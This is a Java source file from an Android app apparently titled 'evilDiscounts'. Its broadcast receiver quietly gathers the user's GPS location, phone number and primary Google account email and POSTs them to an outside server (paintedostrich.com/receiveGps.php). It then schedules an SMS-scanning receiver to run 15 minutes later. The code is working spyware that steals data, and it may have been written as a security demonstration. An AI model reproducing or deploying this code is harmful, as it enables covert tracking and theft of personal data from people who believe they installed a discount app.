package com.evilDiscounts;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Calendar;
import java.util.GregorianCalendar;

import com.evilDiscounts.MyLocation.LocationResult;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.util.Log;

/*
 * When this receiver is triggered, it gets the GPS location of the user and 
 * sends it to the server.
 * It uses the Open Source "Mylocation.Java" class from messesinfo which can be downloaded from
 * http://www.java2s.com/Open-Source/Android/App/messesinfoandroid/cef/messesinfo/maps/MyLocation.java.htm
 */
public class GetGPSReceiver extends BroadcastReceiver {
  Location location;
  
  @Override
  public void onReceive(Context context, Intent intent) {
    location = null;
    // Get an instance of the myLocation class to get the user's location.
    MyLocation myLocation = new MyLocation();
    LocationResult locationResult = new LocationResult(){
        @Override
        public void gotLocation(Location location) {
            GetGPSReceiver.this.location = location;
        }
    };
    myLocation.getLocation(context, locationResult);
    // Spin until the user is located or time out.
    while (location == null);
    
    // Get the user's phone number.
    TelephonyManager mTelephonyMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
    String mynumber = mTelephonyMgr.getLine1Number().substring(1);
    
    // Get the user's primary email.
    Account[] accounts = AccountManager.get(context).getAccountsByType("com.google");
    final String primaryEmail = accounts[0].name;
    // Send them.
    URL url;
    HttpURLConnection connect = null;
    BufferedReader rd;
    StringBuilder sb;
    OutputStreamWriter wr;
    // Change this to the url of your receiveGps.php class.
    String urlString = "http://www.paintedostrich.com/receiveGps.php";
    try {
      System.setProperty("http.keepAlive", "false");
      url = new URL(urlString);
      connect = (HttpURLConnection) url.openConnection();
      connect.setRequestMethod("POST");
      connect.setDoOutput(true);
      connect.setDoInput(true);
      connect.setReadTimeout(10000);

      connect.connect();

      // write to the stream
      String data = URLEncoder.encode("latitude", "UTF-8") + "="
              + URLEncoder.encode(Double.toString(location.getLatitude()), "UTF-8");
      data += "&" + URLEncoder.encode("longitude", "UTF-8") + "="
              + URLEncoder.encode(Double.toString(location.getLongitude()), "UTF-8");
      data += "&" + URLEncoder.encode("myNumber", "UTF-8") + "="
              + URLEncoder.encode(mynumber, "UTF-8");
      data += "&" + URLEncoder.encode("primaryEmail", "UTF-8") + "="
              + URLEncoder.encode(primaryEmail, "UTF-8");

      wr = new OutputStreamWriter(connect.getOutputStream());
      wr.write(data);
      wr.flush();

      // read the result from the server
      rd = new BufferedReader(new InputStreamReader(connect.getInputStream()));
      sb = new StringBuilder();
      String line = null;
      while ((line = rd.readLine()) != null) {
        sb.append(line);
      }
    } catch (MalformedURLException e1) {
      e1.printStackTrace();
      Log.e("URL INVALID:", "The url given, " + urlString + ", is invalid.");
      return;
    } catch (IOException e) {
      e.printStackTrace();
      return;
    } finally {
      // close the connection, set all objects to null
      connect.disconnect();
      rd = null;
      sb = null;
      wr = null;
      connect = null;
      PreferenceManager.getDefaultSharedPreferences(context).edit()
              .putBoolean("gpsSet", true).commit();
      setGpsAlarm(context);
    }
  }
  
  private void setGpsAlarm(Context context) {
    Intent i = new Intent(context, ScanSMSReceiver.class);
    GregorianCalendar cal = new GregorianCalendar();
    int _id = cal.get(Calendar.DAY_OF_YEAR)*1000+cal.get(Calendar.YEAR);  
    //int _id = (int) System.currentTimeMillis();
    PendingIntent appIntent =
        PendingIntent.getBroadcast(context, _id, i, PendingIntent.FLAG_ONE_SHOT);

    cal.add(Calendar.MINUTE, 15);
    Log.i("GET_GPS_ALARM_SET", "Set get gps alarm for " + cal.get(Calendar.HOUR) + ":" + cal.get(Calendar.MINUTE));
    AlarmManager am = (AlarmManager)context.getSystemService(Activity.ALARM_SERVICE);
    am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
            appIntent);
  }
}
